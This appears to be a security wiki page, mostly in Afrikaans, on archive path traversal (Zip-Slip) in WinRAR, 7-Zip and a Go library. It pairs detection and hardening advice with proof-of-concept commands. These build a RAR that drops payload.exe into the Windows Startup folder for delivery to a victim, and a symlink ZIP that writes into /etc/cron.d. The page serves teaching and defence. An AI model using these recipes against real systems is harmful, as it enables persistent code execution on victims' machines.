# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Oorsig

Baie argiefformate (ZIP, RAR, TAR, 7-ZIP, ens.) laat elke inskrywing toe om sy eie **internal path** te hê. Wanneer 'n uitpaknutsding daardie pad blindelings eerbiedig, word 'n gekonfekteerde lêernaam wat `..` of 'n **absolute path** (bv. `C:\Windows\System32\`) bevat, buite die gebruiker-segekose gids geskryf.
Hierdie klas kwesbaarheid is algemeen bekend as *Zip-Slip* of **archive extraction path traversal**.

Gevolge wissel van die oorskryf van willekeurige lêers tot direkte verkryging van **remote code execution (RCE)** deur 'n payload in 'n **auto-run** ligging te plaas, soos die Windows *Startup* folder.

## Worteloorsaak

1. Aanvaller skep 'n argief waar een of meer lêerkoppe die volgende bevat:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Slagoffer pak die argief uit met 'n kwesbare hulpmiddel wat die ingesette pad vertrou (of symlinks volg) in plaas daarvan om dit te saniteer of uit te dwing dat uitpak binne die gekose gids plaasvind.
3. Die lêer word in die aanvallergestyreerde ligging geskryf en word uitgevoer/gelaai die volgende keer as die stelsel of gebruiker daardie pad aktiveer.

## Werklike Voorbeeld – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR vir Windows (insluitend die `rar` / `unrar` CLI, die DLL en die draagbare bron) het versuim om lêername tydens uitpak te valideer.
'n Kwaadaardige RAR-argief wat 'n inskrywing bevat soos:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
sou uiteindelik **buite** die geselekteerde uitvoergids eindig en binne die gebruiker se *Startup*-gids. Na aanmelding voer Windows outomaties alles wat daar teenwoordig is uit, wat *permanente* RCE verskaf.

### Skep van 'n PoC-argief (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opsies gebruik:
* `-ep`  – stoor lêerpaadjies presies soos gegee (do **not** prune leading `./`).

Lewer `evil.rar` aan die slagoffer en instrueer hulle om dit met 'n kwesbare WinRAR build uit te pak.

### Waargenome uitbuiting in die wild

ESET het RomCom (Storm-0978/UNC2596) spear-phishing-veldtogte gerapporteer wat RAR-argiewe aangeheg het wat CVE-2025-8088 misbruik het om customised backdoors te ontplooi en ransomware-operasies te fasiliteer.

## Nuwe gevalle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Fout**: ZIP-inskrywings wat **symbolic links** is, is tydens uitpak na verwys, wat aanvallers in staat stel om die bestemmingsgids te verlaat en ewekansige paaie oor te skryf. Gebruikersinteraksie is net *opening/extracting* van die argief.
* **Geaffekteer**: 7-Zip 21.02–24.09 (Windows & Linux builds). Gefikseer in **25.00** (Julie 2025) en later.
* **Impakpad**: Oorskryf `Start Menu/Programs/Startup` of diens-run-ligginge → kode loop by volgende aanmelding of diensherlaai.
* **Vinnige PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Op 'n gepatchte build sal `/etc/cron.d` nie geraak word nie; die symlink word as 'n link binne /tmp/target uitgepak.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Fout**: `archiver.Unarchive()` volg `../` en symlinked ZIP-inskrywings en skryf buite `outputDir`.
* **Geaffekteer**: `github.com/mholt/archiver` ≤ 3.5.1 (projek nou gedeprekeer).
* **Fix**: Skakel oor na `mholt/archives` ≥ 0.1.0 of implementeer canonical-path kontroles voor skryf.
* **Minimale reproduksie**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Opsporingswenke

* **Statiese inspeksie** – Lys argiefinskrywings en merk enige naam wat `../`, `..\\`, *absolute paths* (`/`, `C:`) bevat of inskrywings van tipe *symlink* wie se teiken buite die uitpakkingsgids is.
* **Kanonisering** – Maak seker `realpath(join(dest, name))` steeds begin met `dest`. Verwerp anders.
* **Sandbox-uitpakking** – Decomprimeer in 'n weggooibare gids met 'n *safe* extractor (bv. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) en verifieer dat die geproduseerde paaie binne die gids bly.
* **Endpoint monitoring** – Waarsku oor nuwe uitvoerbare lêers wat na `Startup`/`Run`/`cron` liggings geskryf word kort nadat 'n argief deur WinRAR/7-Zip/etc. oopgemaak is.

## Versagting & Verharding

1. **Werk die uitpakprogrammatuur by** – WinRAR 7.13+ en 7-Zip 25.00+ implementeer pad-/symlink-sanitisasie. Beide gereedskap het nog steeds geen outomatiese opdatering nie.
2. Pak argiewe uit met “**Do not extract paths**” / “**Ignore paths**” wanneer moontlik.
3. Op Unix, laat priveleges val & mount 'n **chroot/namespace** voor uitpakking; op Windows, gebruik **AppContainer** of 'n sandbox.
4. As jy eie kode skryf, normaliseer met `realpath()`/`PathCanonicalize()` **voor** create/write, en verwerp enige inskrywing wat die bestemming ontsnap.

## Ander geaffekteerde / historiese gevalle

* 2018 – Massiewe *Zip-Slip* advisory deur Snyk wat baie Java/Go/JS-biblioteke raak.
* 2023 – 7-Zip CVE-2023-4011 soortgelyke traversal tydens `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR-uitpak traversal in slugs (patch in v1.2).
* Enige pasgemaakte uitpaklogika wat versuim om `PathCanonicalize` / `realpath` voor skryf aan te roep.

## Verwysings

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
